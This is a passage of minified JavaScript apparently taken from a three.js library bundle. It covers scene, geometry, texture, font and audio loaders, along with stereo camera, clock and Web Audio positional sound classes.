t}},extractUrlBase:function(e){var t=e.lastIndexOf("/");return-1===t?"./":e.substr(0,t+1)}};function Kl(){sn.call(this),this.type="InstancedBufferGeometry",this.instanceCount=1/0}function ql(e,t,n,r){"number"==typeof n&&(r=n,n=!1),$t.call(this,e,t,n),this.meshPerAttribute=r||1}function Xl(e){el.call(this,e)}Kl.prototype=Object.assign(Object.create(sn.prototype),{constructor:Kl,isInstancedBufferGeometry:!0,copy:function(e){return sn.prototype.copy.call(this,e),this.instanceCount=e.instanceCount,this},clone:function(){return(new this.constructor).copy(this)},toJSON:function(){var e=sn.prototype.toJSON.call(this);return e.instanceCount=this.instanceCount,e.isInstancedBufferGeometry=!0,e}}),ql.prototype=Object.assign(Object.create($t.prototype),{constructor:ql,isInstancedBufferAttribute:!0,copy:function(e){return $t.prototype.copy.call(this,e),this.meshPerAttribute=e.meshPerAttribute,this},toJSON:function(){var e=$t.prototype.toJSON.call(this);return e.meshPerAttribute=this.meshPerAttribute,e.isInstancedBufferAttribute=!0,e}}),Xl.prototype=Object.assign(Object.create(el.prototype),{constructor:Xl,load:function(e,t,n,r){var i=this,a=new nl(i.manager);a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)},parse:function(e){var t={},n={};function r(e,r){if(void 0!==t[r])return t[r];var i=e.interleavedBuffers[r],a=function(e,t){if(void 0!==n[t])return n[t];var r=e.arrayBuffers[t],i=new Uint32Array(r).buffer;return n[t]=i}(e,i.buffer),o=new Yi(new Jl[i.type](a),i.stride);return o.uuid=i.uuid,t[r]=o}var i=e.isInstancedBufferGeometry?new Kl:new sn,a=e.data.index;if(void 0!==a){var o=new Jl[a.type](a.array);i.setIndex(new $t(o,1))}var s=e.data.attributes;for(var l in s){var c=s[l],u=void 0;if(c.isInterleavedBufferAttribute)u=new ea(r(e.data,c.data),c.itemSize,c.offset,c.normalized);else{var d=new Jl[c.type](c.array);u=new(c.isInstancedBufferAttribute?ql:$t)(d,c.itemSize,c.normalized)}void 0!==c.name&&(u.name=c.name),i.setAttribute(l,u)}var p=e.data.morphAttributes;if(p)for(var h in p){for(var f=p[h],A=[],m=0,v=f.length;m<v;m++){var g=f[m],y=void 0;y=g.isInterleavedBufferAttribute?new ea(r(e.data,g.data),g.itemSize,g.offset,g.normalized):new $t(new Jl[g.type](g.array),g.itemSize,g.normalized),void 0!==g.name&&(y.name=g.name),A.push(y)}i.morphAttributes[h]=A}e.data.morphTargetsRelative&&(i.morphTargetsRelative=!0);var b=e.data.groups||e.data.drawcalls||e.data.offsets;if(void 0!==b)for(var _=0,w=b.length;_!==w;++_){var C=b[_];i.addGroup(C.start,C.count,C.materialIndex)}var x=e.data.boundingSphere;if(void 0!==x){var S=new he;void 0!==x.center&&S.fromArray(x.center),i.boundingSphere=new Ie(S,x.radius)}return e.name&&(i.name=e.name),e.userData&&(i.userData=e.userData),i}});var Yl,Jl={Int8Array:Int8Array,Uint8Array:Uint8Array,Uint8ClampedArray:"undefined"!=typeof Uint8ClampedArray?Uint8ClampedArray:Uint8Array,Int16Array:Int16Array,Uint16Array:Uint16Array,Int32Array:Int32Array,Uint32Array:Uint32Array,Float32Array:Float32Array,Float64Array:Float64Array},Zl=function(e){function t(t){return e.call(this,t)||this}te(t,e);var n=t.prototype;return n.load=function(e,t,n,r){var i=this,a=""===this.path?Wl.extractUrlBase(e):this.path;this.resourcePath=this.resourcePath||a;var o=new nl(this.manager);o.setPath(this.path),o.setRequestHeader(this.requestHeader),o.setWithCredentials(this.withCredentials),o.load(e,(function(e){var n=null;try{n=JSON.parse(e)}catch(e){return void(void 0!==r&&r(e))}var a=n.metadata;void 0!==a&&void 0!==a.type&&"geometry"!==a.type.toLowerCase()&&i.parse(n,t)}),n,r)},n.parse=function(e,t){var n=this.parseShape(e.shapes),r=this.parseGeometries(e.geometries,n),i=this.parseImages(e.images,(function(){void 0!==t&&t(s)})),a=this.parseTextures(e.textures,i),o=this.parseMaterials(e.materials,a),s=this.parseObject(e.object,r,o);return e.animations&&(s.animations=this.parseAnimations(e.animations)),void 0!==e.images&&0!==e.images.length||void 0!==t&&t(s),s},n.parseShape=function(e){var t={};if(void 0!==e)for(var n=0,r=e.length;n<r;n++){var i=(new Pl).fromJSON(e[n]);t[i.uuid]=i}return t},n.parseGeometries=function(e,t){var n,r={};if(void 0!==e)for(var i=new Xl,a=0,o=e.length;a<o;a++){var s=void 0,l=e[a];switch(l.type){case"PlaneGeometry":case"PlaneBufferGeometry":s=new xs[l.type](l.width,l.height,l.widthSegments,l.heightSegments);break;case"BoxGeometry":case"BoxBufferGeometry":case"CubeGeometry":s=new xs[l.type](l.width,l.height,l.depth,l.widthSegments,l.heightSegments,l.depthSegments);break;case"CircleGeometry":case"CircleBufferGeometry":s=new xs[l.type](l.radius,l.segments,l.thetaStart,l.thetaLength);break;case"CylinderGeometry":case"CylinderBufferGeometry":s=new xs[l.type](l.radiusTop,l.radiusBottom,l.height,l.radialSegments,l.heightSegments,l.openEnded,l.thetaStart,l.thetaLength);break;case"ConeGeometry":case"ConeBufferGeometry":s=new xs[l.type](l.radius,l.height,l.radialSegments,l.heightSegments,l.openEnded,l.thetaStart,l.thetaLength);break;case"SphereGeometry":case"SphereBufferGeometry":s=new xs[l.type](l.radius,l.widthSegments,l.heightSegments,l.phiStart,l.phiLength,l.thetaStart,l.thetaLength);break;case"DodecahedronGeometry":case"DodecahedronBufferGeometry":case"IcosahedronGeometry":case"IcosahedronBufferGeometry":case"OctahedronGeometry":case"OctahedronBufferGeometry":case"TetrahedronGeometry":case"TetrahedronBufferGeometry":s=new xs[l.type](l.radius,l.detail);break;case"RingGeometry":case"RingBufferGeometry":s=new xs[l.type](l.innerRadius,l.outerRadius,l.thetaSegments,l.phiSegments,l.thetaStart,l.thetaLength);break;case"TorusGeometry":case"TorusBufferGeometry":s=new xs[l.type](l.radius,l.tube,l.radialSegments,l.tubularSegments,l.arc);break;case"TorusKnotGeometry":case"TorusKnotBufferGeometry":s=new xs[l.type](l.radius,l.tube,l.tubularSegments,l.radialSegments,l.p,l.q);break;case"TubeGeometry":case"TubeBufferGeometry":s=new xs[l.type]((new Bl[l.path.type]).fromJSON(l.path),l.tubularSegments,l.radius,l.radialSegments,l.closed);break;case"LatheGeometry":case"LatheBufferGeometry":s=new xs[l.type](l.points,l.segments,l.phiStart,l.phiLength);break;case"PolyhedronGeometry":case"PolyhedronBufferGeometry":s=new xs[l.type](l.vertices,l.indices,l.radius,l.details);break;case"ShapeGeometry":case"ShapeBufferGeometry":n=[];for(var c=0,u=l.shapes.length;c<u;c++){var d=t[l.shapes[c]];n.push(d)}s=new xs[l.type](n,l.curveSegments);break;case"ExtrudeGeometry":case"ExtrudeBufferGeometry":n=[];for(var p=0,h=l.shapes.length;p<h;p++){var f=t[l.shapes[p]];n.push(f)}var A=l.options.extrudePath;void 0!==A&&(l.options.extrudePath=(new Bl[A.type]).fromJSON(A)),s=new xs[l.type](n,l.options);break;case"BufferGeometry":case"InstancedBufferGeometry":s=i.parse(l);break;case"Geometry":break;default:continue}s.uuid=l.uuid,void 0!==l.name&&(s.name=l.name),!0===s.isBufferGeometry&&void 0!==l.userData&&(s.userData=l.userData),r[l.uuid]=s}return r},n.parseMaterials=function(e,t){var n={},r={};if(void 0!==e){var i=new Gl;i.setTextures(t);for(var a=0,o=e.length;a<o;a++){var s=e[a];if("MultiMaterial"===s.type){for(var l=[],c=0;c<s.materials.length;c++){var u=s.materials[c];void 0===n[u.uuid]&&(n[u.uuid]=i.parse(u)),l.push(n[u.uuid])}r[s.uuid]=l}else void 0===n[s.uuid]&&(n[s.uuid]=i.parse(s)),r[s.uuid]=n[s.uuid]}}return r},n.parseAnimations=function(e){for(var t=[],n=0;n<e.length;n++){var r=e[n],i=qs.parse(r);void 0!==r.uuid&&(i.uuid=r.uuid),t.push(i)}return t},n.parseImages=function(e,t){var n,r=this,i={};function a(e){return r.manager.itemStart(e),n.load(e,(function(){r.manager.itemEnd(e)}),void 0,(function(){r.manager.itemError(e),r.manager.itemEnd(e)}))}if(void 0!==e&&0<e.length){var o=new Js(t);(n=new al(o)).setCrossOrigin(this.crossOrigin);for(var s=0,l=e.length;s<l;s++){var c=e[s],u=c.url;if(Array.isArray(u)){i[c.uuid]=[];for(var d=0,p=u.length;d<p;d++){var h=u[d],f=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(h)?h:r.resourcePath+h;i[c.uuid].push(a(f))}}else{var A=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(c.url)?c.url:r.resourcePath+c.url;i[c.uuid]=a(A)}}}return i},n.parseTextures=function(e,t){function n(e,t){return"number"==typeof e?e:t[e]}var r={};if(void 0!==e)for(var i=0,a=e.length;i<a;i++){var o=e[i];o.image,t[o.image];var s=void 0;(s=Array.isArray(t[o.image])?new Nn(t[o.image]):new le(t[o.image])).needsUpdate=!0,s.uuid=o.uuid,void 0!==o.name&&(s.name=o.name),void 0!==o.mapping&&(s.mapping=n(o.mapping,ec)),void 0!==o.offset&&s.offset.fromArray(o.offset),void 0!==o.repeat&&s.repeat.fromArray(o.repeat),void 0!==o.center&&s.center.fromArray(o.center),void 0!==o.rotation&&(s.rotation=o.rotation),void 0!==o.wrap&&(s.wrapS=n(o.wrap[0],tc),s.wrapT=n(o.wrap[1],tc)),void 0!==o.format&&(s.format=o.format),void 0!==o.type&&(s.type=o.type),void 0!==o.encoding&&(s.encoding=o.encoding),void 0!==o.minFilter&&(s.minFilter=n(o.minFilter,nc)),void 0!==o.magFilter&&(s.magFilter=n(o.magFilter,nc)),void 0!==o.anisotropy&&(s.anisotropy=o.anisotropy),void 0!==o.flipY&&(s.flipY=o.flipY),void 0!==o.premultiplyAlpha&&(s.premultiplyAlpha=o.premultiplyAlpha),void 0!==o.unpackAlignment&&(s.unpackAlignment=o.unpackAlignment),r[o.uuid]=s}return r},n.parseObject=function(e,t,n){var r,i,a;function o(e){return t[e],t[e]}function s(e){if(void 0!==e){if(Array.isArray(e)){for(var t=[],r=0,i=e.length;r<i;r++){var a=e[r];n[a],t.push(n[a])}return t}return n[e],n[e]}}switch(e.type){case"Scene":r=new Xi,void 0!==e.background&&Number.isInteger(e.background)&&(r.background=new Lt(e.background)),void 0!==e.fog&&("Fog"===e.fog.type?r.fog=new qi(e.fog.color,e.fog.near,e.fog.far):"FogExp2"===e.fog.type&&(r.fog=new Ki(e.fog.color,e.fog.density)));break;case"PerspectiveCamera":r=new Ln(e.fov,e.aspect,e.near,e.far),void 0!==e.focus&&(r.focus=e.focus),void 0!==e.zoom&&(r.zoom=e.zoom),void 0!==e.filmGauge&&(r.filmGauge=e.filmGauge),void 0!==e.filmOffset&&(r.filmOffset=e.filmOffset),void 0!==e.view&&(r.view=Object.assign({},e.view));break;case"OrthographicCamera":r=new jl(e.left,e.right,e.top,e.bottom,e.near,e.far),void 0!==e.zoom&&(r.zoom=e.zoom),void 0!==e.view&&(r.view=Object.assign({},e.view));break;case"AmbientLight":r=new zl(e.color,e.intensity);break;case"DirectionalLight":r=new $l(e.color,e.intensity);break;case"PointLight":r=new Rl(e.color,e.intensity,e.distance,e.decay);break;case"RectAreaLight":r=new Hl(e.color,e.intensity,e.width,e.height);break;case"SpotLight":r=new Nl(e.color,e.intensity,e.distance,e.angle,e.penumbra,e.decay);break;case"HemisphereLight":r=new Fl(e.color,e.groundColor,e.intensity);break;case"LightProbe":r=(new Ql).fromJSON(e);break;case"SkinnedMesh":case"Mesh":r=new Sn(i=o(e.geometry),a=s(e.material));break;case"InstancedMesh":i=o(e.geometry),a=s(e.material);var l=e.count,c=e.instanceMatrix;(r=new Fa(i,a,l)).instanceMatrix=new $t(new Float32Array(c.array),16);break;case"LOD":r=new Ca;break;case"Line":r=new Ua(o(e.geometry),s(e.material),e.mode);break;case"LineLoop":r=new Va(o(e.geometry),s(e.material));break;case"LineSegments":r=new Ha(o(e.geometry),s(e.material));break;case"PointCloud":case"Points":r=new Xa(o(e.geometry),s(e.material));break;case"Sprite":r=new fa(s(e.material));break;case"Group":r=new zi;break;default:r=new pt}if(r.uuid=e.uuid,void 0!==e.name&&(r.name=e.name),void 0!==e.matrix?(r.matrix.fromArray(e.matrix),void 0!==e.matrixAutoUpdate&&(r.matrixAutoUpdate=e.matrixAutoUpdate),r.matrixAutoUpdate&&r.matrix.decompose(r.position,r.quaternion,r.scale)):(void 0!==e.position&&r.position.fromArray(e.position),void 0!==e.rotation&&r.rotation.fromArray(e.rotation),void 0!==e.quaternion&&r.quaternion.fromArray(e.quaternion),void 0!==e.scale&&r.scale.fromArray(e.scale)),void 0!==e.castShadow&&(r.castShadow=e.castShadow),void 0!==e.receiveShadow&&(r.receiveShadow=e.receiveShadow),e.shadow&&(void 0!==e.shadow.bias&&(r.shadow.bias=e.shadow.bias),void 0!==e.shadow.normalBias&&(r.shadow.normalBias=e.shadow.normalBias),void 0!==e.shadow.radius&&(r.shadow.radius=e.shadow.radius),void 0!==e.shadow.mapSize&&r.shadow.mapSize.fromArray(e.shadow.mapSize),void 0!==e.shadow.camera&&(r.shadow.camera=this.parseObject(e.shadow.camera))),void 0!==e.visible&&(r.visible=e.visible),void 0!==e.frustumCulled&&(r.frustumCulled=e.frustumCulled),void 0!==e.renderOrder&&(r.renderOrder=e.renderOrder),void 0!==e.userData&&(r.userData=e.userData),void 0!==e.layers&&(r.layers.mask=e.layers),void 0!==e.children)for(var u=e.children,d=0;d<u.length;d++)r.add(this.parseObject(u[d],t,n));if("LOD"===e.type){void 0!==e.autoUpdate&&(r.autoUpdate=e.autoUpdate);for(var p=e.levels,h=0;h<p.length;h++){var f=p[h],A=r.getObjectByProperty("uuid",f.object);void 0!==A&&r.addLevel(A,f.distance)}}return r},n.setTexturePath=function(e){return this.setResourcePath(e)},t}(el),ec={UVMapping:300,CubeReflectionMapping:n,CubeRefractionMapping:r,EquirectangularReflectionMapping:i,EquirectangularRefractionMapping:a,CubeUVReflectionMapping:o,CubeUVRefractionMapping:s},tc={RepeatWrapping:l,ClampToEdgeWrapping:c,MirroredRepeatWrapping:u},nc={NearestFilter:d,NearestMipmapNearestFilter:p,NearestMipmapLinearFilter:h,LinearFilter:f,LinearMipmapNearestFilter:A,LinearMipmapLinearFilter:m};function rc(e){el.call(this,e),this.options={premultiplyAlpha:"none"}}function ic(){this.type="ShapePath",this.color=new Lt,this.subPaths=[],this.currentPath=null}function ac(e){this.type="Font",this.data=e}function oc(e,t,n,r,i){var a=i.glyphs[e]||i.glyphs["?"];if(a){var o,s,l,c,u,d,p,h,f=new ic;if(a.o)for(var A=a._cachedOutline||(a._cachedOutline=a.o.split(" ")),m=0,v=A.length;m<v;)switch(A[m++]){case"m":o=A[m++]*t+n,s=A[m++]*t+r,f.moveTo(o,s);break;case"l":o=A[m++]*t+n,s=A[m++]*t+r,f.lineTo(o,s);break;case"q":l=A[m++]*t+n,c=A[m++]*t+r,u=A[m++]*t+n,d=A[m++]*t+r,f.quadraticCurveTo(u,d,l,c);break;case"b":l=A[m++]*t+n,c=A[m++]*t+r,u=A[m++]*t+n,d=A[m++]*t+r,p=A[m++]*t+n,h=A[m++]*t+r,f.bezierCurveTo(u,d,p,h,l,c)}return{offsetX:a.ha*t,path:f}}}function sc(e){el.call(this,e)}rc.prototype=Object.assign(Object.create(el.prototype),{constructor:rc,isImageBitmapLoader:!0,setOptions:function(e){return this.options=e,this},load:function(e,t,n,r){void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var i=this,a=Ys.get(e);if(void 0!==a)return i.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;var o={};o.credentials="anonymous"===this.crossOrigin?"same-origin":"include",fetch(e,o).then((function(e){return e.blob()})).then((function(e){return createImageBitmap(e,i.options)})).then((function(n){Ys.add(e,n),t&&t(n),i.manager.itemEnd(e)})).catch((function(t){r&&r(t),i.manager.itemError(e),i.manager.itemEnd(e)})),i.manager.itemStart(e)}}),Object.assign(ic.prototype,{moveTo:function(e,t){return this.currentPath=new Tl,this.subPaths.push(this.currentPath),this.currentPath.moveTo(e,t),this},lineTo:function(e,t){return this.currentPath.lineTo(e,t),this},quadraticCurveTo:function(e,t,n,r){return this.currentPath.quadraticCurveTo(e,t,n,r),this},bezierCurveTo:function(e,t,n,r,i,a){return this.currentPath.bezierCurveTo(e,t,n,r,i,a),this},splineThru:function(e){return this.currentPath.splineThru(e),this},toShapes:function(e,t){function n(e){for(var t=[],n=0,r=e.length;n<r;n++){var i=e[n],a=new Pl;a.curves=i.curves,t.push(a)}return t}function r(e,t){for(var n=t.length,r=!1,i=n-1,a=0;a<n;i=a++){var o=t[i],s=t[a],l=s.x-o.x,c=s.y-o.y;if(Math.abs(c)>Number.EPSILON){if(c<0&&(o=t[a],l=-l,s=t[i],c=-c),e.y<o.y||e.y>s.y)continue;if(e.y===o.y){if(e.x===o.x)return!0}else{var u=c*(e.x-o.x)-l*(e.y-o.y);if(0===u)return!0;if(u<0)continue;r=!r}}else{if(e.y!==o.y)continue;if(s.x<=e.x&&e.x<=o.x||o.x<=e.x&&e.x<=s.x)return!0}}return r}var i,a,o,s=Qo.isClockWise,l=this.subPaths;if(0===l.length)return[];if(!0===t)return n(l);var c=[];if(1===l.length)return a=l[0],(o=new Pl).curves=a.curves,c.push(o),c;var u=!s(l[0].getPoints());u=e?!u:u;var d,p,h=[],f=[],A=[],m=0;f[m]=void 0,A[m]=[];for(var v=0,g=l.length;v<g;v++)i=s(d=(a=l[v]).getPoints()),(i=e?!i:i)?(!u&&f[m]&&m++,f[m]={s:new Pl,p:d},f[m].s.curves=a.curves,u&&m++,A[m]=[]):A[m].push({h:a,p:d[0]});if(!f[0])return n(l);if(1<f.length){for(var y=!1,b=[],_=0,w=f.length;_<w;_++)h[_]=[];for(var C=0,x=f.length;C<x;C++)for(var S=A[C],k=0;k<S.length;k++){for(var M=S[k],B=!0,E=0;E<f.length;E++)r(M.p,f[E].p)&&(C!==E&&b.push({froms:C,tos:E,hole:k}),B?(B=!1,h[E].push(M)):y=!0);B&&h[C].push(M)}0<b.length&&(y||(A=h))}for(var T=0,P=f.length;T<P;T++){o=f[T].s,c.push(o);for(var I=0,F=(p=A[T]).length;I<F;I++)o.holes.push(p[I].h)}return c}}),Object.assign(ac.prototype,{isFont:!0,generateShapes:function(e,t){void 0===t&&(t=100);for(var n=[],r=function(e,t,n){for(var r=Array.from?Array.from(e):String(e).split(""),i=t/n.resolution,a=(n.boundingBox.yMax-n.boundingBox.yMin+n.underlineThickness)*i,o=[],s=0,l=0,c=0;c<r.length;c++){var u=r[c];if("\n"===u)s=0,l-=a;else{var d=oc(u,i,s,l,n);s+=d.offsetX,o.push(d.path)}}return o}(e,t,this.data),i=0,a=r.length;i<a;i++)Array.prototype.push.apply(n,r[i].toShapes());return n}}),sc.prototype=Object.assign(Object.create(el.prototype),{constructor:sc,load:function(e,t,n,r){var i=this,a=new nl(this.manager);a.setPath(this.path),a.setRequestHeader(this.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(e){var n;try{n=JSON.parse(e)}catch(r){n=JSON.parse(e.substring(65,e.length-2))}var r=i.parse(n);t&&t(r)}),n,r)},parse:function(e){return new ac(e)}});var lc={getContext:function(){return void 0===Yl&&(Yl=new(window.AudioContext||window.webkitAudioContext)),Yl},setContext:function(e){Yl=e}};function cc(e){el.call(this,e)}function uc(e,t,n){Ql.call(this,void 0,n);var r=(new Lt).set(e),i=(new Lt).set(t),a=new he(r.r,r.g,r.b),o=new he(i.r,i.g,i.b),s=Math.sqrt(Math.PI),l=s*Math.sqrt(.75);this.sh.coefficients[0].copy(a).add(o).multiplyScalar(s),this.sh.coefficients[1].copy(a).sub(o).multiplyScalar(l)}function dc(e,t){Ql.call(this,void 0,t);var n=(new Lt).set(e);this.sh.coefficients[0].set(n.r,n.g,n.b).multiplyScalar(2*Math.sqrt(Math.PI))}cc.prototype=Object.assign(Object.create(el.prototype),{constructor:cc,load:function(e,t,n,r){var i=this,a=new nl(i.manager);a.setResponseType("arraybuffer"),a.setPath(i.path),a.setRequestHeader(i.requestHeader),a.setWithCredentials(i.withCredentials),a.load(e,(function(n){try{var a=n.slice(0);lc.getContext().decodeAudioData(a,(function(e){t(e)}))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)}}),uc.prototype=Object.assign(Object.create(Ql.prototype),{constructor:uc,isHemisphereLightProbe:!0,copy:function(e){return Ql.prototype.copy.call(this,e),this},toJSON:function(e){return Ql.prototype.toJSON.call(this,e)}}),dc.prototype=Object.assign(Object.create(Ql.prototype),{constructor:dc,isAmbientLightProbe:!0,copy:function(e){return Ql.prototype.copy.call(this,e),this},toJSON:function(e){return Ql.prototype.toJSON.call(this,e)}});var pc=new $e,hc=new $e;function fc(){this.type="StereoCamera",this.aspect=1,this.eyeSep=.064,this.cameraL=new Ln,this.cameraL.layers.enable(1),this.cameraL.matrixAutoUpdate=!1,this.cameraR=new Ln,this.cameraR.layers.enable(2),this.cameraR.matrixAutoUpdate=!1,this._cache={focus:null,fov:null,aspect:null,near:null,far:null,zoom:null,eyeSep:null}}Object.assign(fc.prototype,{update:function(e){var t=this._cache;if(t.focus!==e.focus||t.fov!==e.fov||t.aspect!==e.aspect*this.aspect||t.near!==e.near||t.far!==e.far||t.zoom!==e.zoom||t.eyeSep!==this.eyeSep){t.focus=e.focus,t.fov=e.fov,t.aspect=e.aspect*this.aspect,t.near=e.near,t.far=e.far,t.zoom=e.zoom,t.eyeSep=this.eyeSep;var n,r,i=e.projectionMatrix.clone(),a=t.eyeSep/2,o=a*t.near/t.focus,s=t.near*Math.tan(J.DEG2RAD*t.fov*.5)/t.zoom;hc.elements[12]=-a,pc.elements[12]=a,n=-s*t.aspect+o,r=s*t.aspect+o,i.elements[0]=2*t.near/(r-n),i.elements[8]=(r+n)/(r-n),this.cameraL.projectionMatrix.copy(i),n=-s*t.aspect-o,r=s*t.aspect-o,i.elements[0]=2*t.near/(r-n),i.elements[8]=(r+n)/(r-n),this.cameraR.projectionMatrix.copy(i)}this.cameraL.matrixWorld.copy(e.matrixWorld).multiply(hc),this.cameraR.matrixWorld.copy(e.matrixWorld).multiply(pc)}});var Ac=function(){function e(e){this.autoStart=void 0===e||e,this.startTime=0,this.oldTime=0,this.elapsedTime=0,this.running=!1}var t=e.prototype;return t.start=function(){this.startTime=("undefined"==typeof performance?Date:performance).now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0},t.stop=function(){this.getElapsedTime(),this.running=!1,this.autoStart=!1},t.getElapsedTime=function(){return this.getDelta(),this.elapsedTime},t.getDelta=function(){var e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){var t=("undefined"==typeof performance?Date:performance).now();e=(t-this.oldTime)/1e3,this.oldTime=t,this.elapsedTime+=e}return e},e}(),mc=new he,vc=new pe,gc=new he,yc=new he,bc=function(e){function t(){var t;return(t=e.call(this)||this).type="AudioListener",t.context=lc.getContext(),t.gain=t.context.createGain(),t.gain.connect(t.context.destination),t.filter=null,t.timeDelta=0,t._clock=new Ac,t}te(t,e);var n=t.prototype;return n.getInput=function(){return this.gain},n.removeFilter=function(){return null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null),this},n.getFilter=function(){return this.filter},n.setFilter=function(e){return null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination),this.filter=e,this.gain.connect(this.filter),this.filter.connect(this.context.destination),this},n.getMasterVolume=function(){return this.gain.gain.value},n.setMasterVolume=function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this},n.updateMatrixWorld=function(t){e.prototype.updateMatrixWorld.call(this,t);var n=this.context.listener,r=this.up;if(this.timeDelta=this._clock.getDelta(),this.matrixWorld.decompose(mc,vc,gc),yc.set(0,0,-1).applyQuaternion(vc),n.positionX){var i=this.context.currentTime+this.timeDelta;n.positionX.linearRampToValueAtTime(mc.x,i),n.positionY.linearRampToValueAtTime(mc.y,i),n.positionZ.linearRampToValueAtTime(mc.z,i),n.forwardX.linearRampToValueAtTime(yc.x,i),n.forwardY.linearRampToValueAtTime(yc.y,i),n.forwardZ.linearRampToValueAtTime(yc.z,i),n.upX.linearRampToValueAtTime(r.x,i),n.upY.linearRampToValueAtTime(r.y,i),n.upZ.linearRampToValueAtTime(r.z,i)}else n.setPosition(mc.x,mc.y,mc.z),n.setOrientation(yc.x,yc.y,yc.z,r.x,r.y,r.z)},t}(pt),_c=function(e){function t(t){var n;return(n=e.call(this)||this).type="Audio",n.listener=t,n.context=t.context,n.gain=n.context.createGain(),n.gain.connect(t.getInput()),n.autoplay=!1,n.buffer=null,n.detune=0,n.loop=!1,n.loopStart=0,n.loopEnd=0,n.offset=0,n.duration=void 0,n.playbackRate=1,n.isPlaying=!1,n.hasPlaybackControl=!0,n.source=null,n.sourceType="empty",n._startedAt=0,n._progress=0,n._connected=!1,n.filters=[],n}te(t,e);var n=t.prototype;return n.getOutput=function(){return this.gain},n.setNodeSource=function(e){return this.hasPlaybackControl=!1,this.sourceType="audioNode",this.source=e,this.connect(),this},n.setMediaElementSource=function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaNode",this.source=this.context.createMediaElementSource(e),this.connect(),this},n.setMediaStreamSource=function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaStreamNode",this.source=this.context.createMediaStreamSource(e),this.connect(),this},n.setBuffer=function(e){return this.buffer=e,this.sourceType="buffer",this.autoplay&&this.play(),this},n.play=function(e){if(void 0===e&&(e=0),!0!==this.isPlaying&&!1!==this.hasPlaybackControl){this._startedAt=this.context.currentTime+e;var t=this.context.createBufferSource();return t.buffer=this.buffer,t.loop=this.loop,t.loopStart=this.loopStart,t.loopEnd=this.loopEnd,t.onended=this.onEnded.bind(this),t.start(this._startedAt,this._progress+this.offset,this.duration),this.isPlaying=!0,this.source=t,this.setDetune(this.detune),this.setPlaybackRate(this.playbackRate),this.connect()}},n.pause=function(){if(!1!==this.hasPlaybackControl)return!0===this.isPlaying&&(this._progress+=Math.max(this.context.currentTime-this._startedAt,0)*this.playbackRate,!0===this.loop&&(this._progress=this._progress%(this.duration||this.buffer.duration)),this.source.stop(),this.source.onended=null,this.isPlaying=!1),this},n.stop=function(){if(!1!==this.hasPlaybackControl)return this._progress=0,this.source.stop(),this.source.onended=null,this.isPlaying=!1,this},n.connect=function(){if(0<this.filters.length){this.source.connect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].connect(this.filters[e]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this._connected=!0,this},n.disconnect=function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].disconnect(this.filters[e]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this._connected=!1,this},n.getFilters=function(){return this.filters},n.setFilters=function(e){return e||(e=[]),!0===this._connected?(this.disconnect(),this.filters=e.slice(),this.connect()):this.filters=e.slice(),this},n.setDetune=function(e){if(this.detune=e,void 0!==this.source.detune)return!0===this.isPlaying&&this.source.detune.setTargetAtTime(this.detune,this.context.currentTime,.01),this},n.getDetune=function(){return this.detune},n.getFilter=function(){return this.getFilters()[0]},n.setFilter=function(e){return this.setFilters(e?[e]:[])},n.setPlaybackRate=function(e){if(!1!==this.hasPlaybackControl)return this.playbackRate=e,!0===this.isPlaying&&this.source.playbackRate.setTargetAtTime(this.playbackRate,this.context.currentTime,.01),this},n.getPlaybackRate=function(){return this.playbackRate},n.onEnded=function(){this.isPlaying=!1},n.getLoop=function(){return!1!==this.hasPlaybackControl&&this.loop},n.setLoop=function(e){if(!1!==this.hasPlaybackControl)return this.loop=e,!0===this.isPlaying&&(this.source.loop=this.loop),this},n.setLoopStart=function(e){return this.loopStart=e,this},n.setLoopEnd=function(e){return this.loopEnd=e,this},n.getVolume=function(){return this.gain.gain.value},n.setVolume=function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this},t}(pt),wc=new he,Cc=new pe,xc=new he,Sc=new he,kc=function(e){function t(t){var n;return(n=e.call(this,t)||this).panner=n.context.createPanner(),n.panner.panningModel="HRTF",n.panner.connect(n.gain),n}te(t,e);var n=t.prototype;return n.getOutput=function(){return this.panner},n.getRefDistance=function(){return this.panner.refDistance},n.setRefDistance=function(e){return this.panner.refDistance=e,this},n.getRolloffFactor=function(){return this.panner.rolloffFactor},n.setRolloffFactor=function(e){return this.panner.rolloffFactor=e,this},n.getDistanceModel=function(){return this.panner.distanceModel},n.setDistanceModel=function(e){return this.panner.distanceModel=e,this},n.getMaxDistance=function(){return this.panner.maxDistance},n.setMaxDistance=function(e){return this.panner.maxDistance=e,this},n.setDirectionalCone=function(e,t,n){return this.panner.coneInnerAngle=e,this.panner.coneOuterAngle=t,this.panner.coneOuterGain=n,this},n.updateMatrixWorld=function(t){if(e.prototype.updateMatrixWorld.call(this,t),!0!==this.hasPlaybackControl||!1!==this.isPlaying){this.matrixWorld.decompose(wc,Cc,xc),Sc.set(0,0,1).applyQuaternion(Cc);var n=this.panner;if(n.positionX){var 